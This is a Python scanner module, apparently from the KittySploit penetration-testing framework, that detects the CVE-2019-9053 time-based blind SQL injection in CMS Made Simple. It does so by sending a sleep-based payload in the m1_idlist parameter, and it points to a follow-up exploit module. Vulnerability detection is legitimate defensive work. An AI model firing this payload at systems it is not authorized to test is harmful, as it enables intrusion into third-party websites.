#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CMS Made Simple CVE-2019-9053 time-based SQLi detection."""

from __future__ import annotations

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "CMS Made Simple CVE-2019-9053 SQLi Detect",
        "description": "Time-based blind SQLi on moduleinterface.php News m1_idlist.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2019-9053"],
        "tags": ["web", "scanner", "cmsms", "sqli", "cve-2019-9053"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-9053"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals"],
            "chain": {
                "suggested_followups": ["exploits/multi/http/cms_made_simple_cve_2019_9053_sqli"],
            },
        },
    }

    cms_path = OptString("", "CMS subdirectory prefix", required=False)
    time_delay = OptInt(1, "Sleep seconds in probe", required=False, advanced=True)

    def _url(self, suffix: str) -> str:
        prefix = str(self.cms_path or "").strip().rstrip("/")
        base = f"{prefix}/moduleinterface.php" if prefix else "/moduleinterface.php"
        return base + "?mact=News,m1_,default,0&m1_idlist=" + suffix

    def _elapsed(self, suffix: str) -> float:
        start = time.time()
        self.http_request("GET", self._url(suffix))
        return time.time() - start

    def run(self):
        delay = int(self.time_delay or 1)
        base = self._elapsed("a,b,1,5)")
        slow = self._elapsed(f"a,b,1,5))+and+(select+sleep({delay}))+--+")
        if slow >= base + delay * 0.75:
            self.set_info(
                severity="critical",
                cve="CVE-2019-9053",
                reason="Time-based SQLi on m1_idlist",
                confidence="high",
            )
            return True
        return False
